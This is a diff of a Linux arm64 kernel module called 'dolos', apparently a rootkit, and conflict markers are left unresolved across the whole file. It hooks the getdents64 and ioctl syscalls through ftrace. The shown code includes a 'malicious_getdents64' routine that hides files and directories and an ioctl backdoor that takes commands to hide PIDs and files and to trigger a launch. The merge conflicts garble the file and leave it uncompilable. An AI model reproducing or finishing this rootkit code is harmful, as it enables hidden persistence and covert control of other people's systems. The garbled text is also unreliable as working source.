@@ -3,7 +3,11 @@
 #include <linux/kernel.h>
 #include <linux/syscalls.h>
 #include <linux/dirent.h>
+<<<<<<< HEAD
 #include <linux/kprobes.h>
+=======
+#include <linux/kprobes.h>//
+>>>>>>> 4e261d6ee82894ba840aacf35e891089fc37f7ca
 #include <linux/ftrace.h>
 #include <asm/cacheflush.h>
 #include <linux/module.h>
@@ -11,7 +15,10 @@
 #include <linux/errno.h>
 #include <linux/ftrace.h>
 #include <linux/delay.h>
+<<<<<<< HEAD
 #include <linux/string.h>
+=======
+>>>>>>> 4e261d6ee82894ba840aacf35e891089fc37f7ca
 
 MODULE_LICENSE("GPL");
 MODULE_VERSION("0.1");
@@ -26,10 +33,15 @@ MODULE_VERSION("0.1");
 #define CHECKUP 80085
 #define GOODRET 42
 #define HIDEFILE 1234
+<<<<<<< HEAD
+=======
+
+>>>>>>> 4e261d6ee82894ba840aacf35e891089fc37f7ca
 /* A simple debug print macro that will be compiled out if not defined */
   /* https://stackoverflow.com/questions/1644868/define-macro-for-debug-printing-in-c */
 #define debug_print(fmt, args...)\
     do { if (DEBUG) pr_warn(fmt, ##args); } while(0)
+<<<<<<< HEAD
     
 #define MAX_NAME 256
 
@@ -44,6 +56,11 @@ bool gotime = false;
 bool launch = false;
 char pid[MAX_NAME];
 char lpid[MAX_NAME];
+=======
+
+bool gotime = false;
+char pid[MAX_NAME];
+>>>>>>> 4e261d6ee82894ba840aacf35e891089fc37f7ca
 char filename[MAX_NAME];
 bool rfilename = false;
 bool rpid = false;
@@ -72,6 +89,15 @@ typedef struct RegisterMap {
 RegisterMap *reg_map1;
 RegisterMap *rm;
 
+<<<<<<< HEAD
+=======
+typedef asmlinkage long (*orig_syscall_t)(const struct pt_regs *);
+
+orig_syscall_t orig_ioctl;
+
+const char *HIDE_DIR = "dolos";
+
+>>>>>>> 4e261d6ee82894ba840aacf35e891089fc37f7ca
 struct ftrace_hook {
     const char *name;
     void * function;
@@ -86,6 +112,7 @@ struct ftrace_hook {
         .original = (_original),             \
     }
 
+<<<<<<< HEAD
 int malicious_getdents64(struct linux_dirent64 *ker_dirent, unsigned int *count, int orig_ret);
 
 // Generic handler for any function we want to hook
@@ -97,6 +124,13 @@ static void notrace dolos_ftrace_stub(unsigned long ip, unsigned long parent_ip,
 {
     struct pt_regs *regs = ftrace_get_regs(fregs);
     struct ftrace_hook * fhook = op->private; // data we can pass in
+=======
+static void notrace dolos_ftrace_stub(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct ftrace_regs *fregs)
+/* When an ftraced function gets called, this is our generic handler. It will call our version of the hooked function */
+{	
+    struct pt_regs *regs = ftrace_get_regs(fregs);
+    struct ftrace_hook * fhook = op->private;
+>>>>>>> 4e261d6ee82894ba840aacf35e891089fc37f7ca
     /* Since we will call the original function again we need to make sure we don't end up in a loop
      * Check to see if our module is the caller of the original. If yes, don't change PC
      */
@@ -106,6 +140,7 @@ static void notrace dolos_ftrace_stub(unsigned long ip, unsigned long parent_ip,
     }
 }
 
+<<<<<<< HEAD
 static void malicious_ioctl(unsigned long arg, unsigned long *kernel_argp);
 
 /* Hook to hide directories/files */
@@ -184,6 +219,13 @@ int malicious_getdents64(struct linux_dirent64 *ker_dirent, unsigned int *count,
 }
 
 
+=======
+
+static void malicious_ioctl(unsigned long arg, unsigned long *kernel_argp);
+
+
+/* set registers & determine hook*/
+>>>>>>> 4e261d6ee82894ba840aacf35e891089fc37f7ca
 static asmlinkage long dolos_ioctl(struct pt_regs *regs)
 {
     /* ioctl(unsigned int fd, unsigned int cmd, unsigned long arg) */
@@ -197,8 +239,12 @@ static asmlinkage long dolos_ioctl(struct pt_regs *regs)
 
         if (fd == ROOTKIT) { // Our creators are talking to us
                 if (cmd == SENDPID) { // pid
+<<<<<<< HEAD
                         sprintf(pid, "/proc/%d", arg);
 			            sprintf(lpid, "%d", arg);
+=======
+                        sprintf(pid, "%ld", arg);
+>>>>>>> 4e261d6ee82894ba840aacf35e891089fc37f7ca
                         return GOODRET;
 
                 } else if (cmd == HIDEFILE) {
@@ -206,7 +252,11 @@ static asmlinkage long dolos_ioctl(struct pt_regs *regs)
                         return GOODRET;
 
                 } else if (cmd == RATSIGLAUNCH) { // CWEs ASSEMBLE
+<<<<<<< HEAD
 			            gotime = true;
+=======
+			gotime = true;
+>>>>>>> 4e261d6ee82894ba840aacf35e891089fc37f7ca
                         return GOODRET;
                 
 		} else if (cmd == CHECKUP) {
@@ -327,6 +377,10 @@ static void map_regions(void) {
   return;
 }
 
+<<<<<<< HEAD
+=======
+
+>>>>>>> 4e261d6ee82894ba840aacf35e891089fc37f7ca
 static void malicious_ioctl(unsigned long arg, unsigned long *kernel_argp)
 {
 
@@ -407,6 +461,10 @@ static void malicious_ioctl(unsigned long arg, unsigned long *kernel_argp)
 	
 }
 
+<<<<<<< HEAD
+=======
+
+>>>>>>> 4e261d6ee82894ba840aacf35e891089fc37f7ca
 struct ftrace_ops ops = {
     .func = dolos_ftrace_stub,
     .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY
@@ -429,7 +487,11 @@ static unsigned long lookup_name(const char *name)
     return addr;
 }
 
+<<<<<<< HEAD
 static int install_hook(struct ftrace_hook* hook) // install ftrace hook
+=======
+static int install_hook(struct ftrace_hook* hook)
+>>>>>>> 4e261d6ee82894ba840aacf35e891089fc37f7ca
 {
     int ret = 0;
     /* lookup the original symbol */
@@ -447,7 +509,12 @@ static int install_hook(struct ftrace_hook* hook) // install ftrace hook
     hook->ops.func = dolos_ftrace_stub;
     hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;
     hook->ops.private = hook;
+<<<<<<< HEAD
     ret = ftrace_set_filter_ip(&hook->ops, address, 0, 0); // pass ops structure and address we want to hook, sometimes more than one function has the same name, pass ip for accuracy
+=======
+
+    ret = ftrace_set_filter_ip(&hook->ops, address, 0, 0);
+>>>>>>> 4e261d6ee82894ba840aacf35e891089fc37f7ca
     if (ret) {
         debug_print("ftrace_set_filter_ip failed: %d\n", ret);
         return ret;
@@ -473,7 +540,11 @@ static void remove_hook(struct ftrace_hook* hook)
     }
 }
 
+<<<<<<< HEAD
 static int install_hooks(struct ftrace_hook *hooks, size_t count) // look through array of hooks
+=======
+static int install_hooks(struct ftrace_hook *hooks, size_t count)
+>>>>>>> 4e261d6ee82894ba840aacf35e891089fc37f7ca
 {
     size_t i;
     int ret = 0;
@@ -503,10 +574,18 @@ static void remove_hooks(struct ftrace_hook * hooks, size_t count)
     }
 }
 
+<<<<<<< HEAD
 /* an array of functions we want to hook */
 static struct ftrace_hook hooks[] = {
     HOOK("__arm64_sys_getdents64", dolos_getdents64, &orig_getdents64),
     HOOK("__arm64_sys_ioctl", dolos_ioctl, &orig_ioctl),
+=======
+
+/* an array of functions we want to hook */
+static struct ftrace_hook hooks[] = {
+    HOOK("__arm64_sys_ioctl", dolos_ioctl, &orig_ioctl),
+
+>>>>>>> 4e261d6ee82894ba840aacf35e891089fc37f7ca
 };
 
 
@@ -520,7 +599,10 @@ static int __init dolos_init(void)
         return ret;
     }
     debug_print("Loaded\n");
+<<<<<<< HEAD
     
+=======
+>>>>>>> 4e261d6ee82894ba840aacf35e891089fc37f7ca
 
     return 0;
 }
@@ -537,4 +619,7 @@ static void __exit dolos_exit(void)
 /* register our init and exit functions */
 module_init(dolos_init);
 module_exit(dolos_exit);
+<<<<<<< HEAD
 
+=======
+>>>>>>> 4e261d6ee82894ba840aacf35e891089fc37f7ca
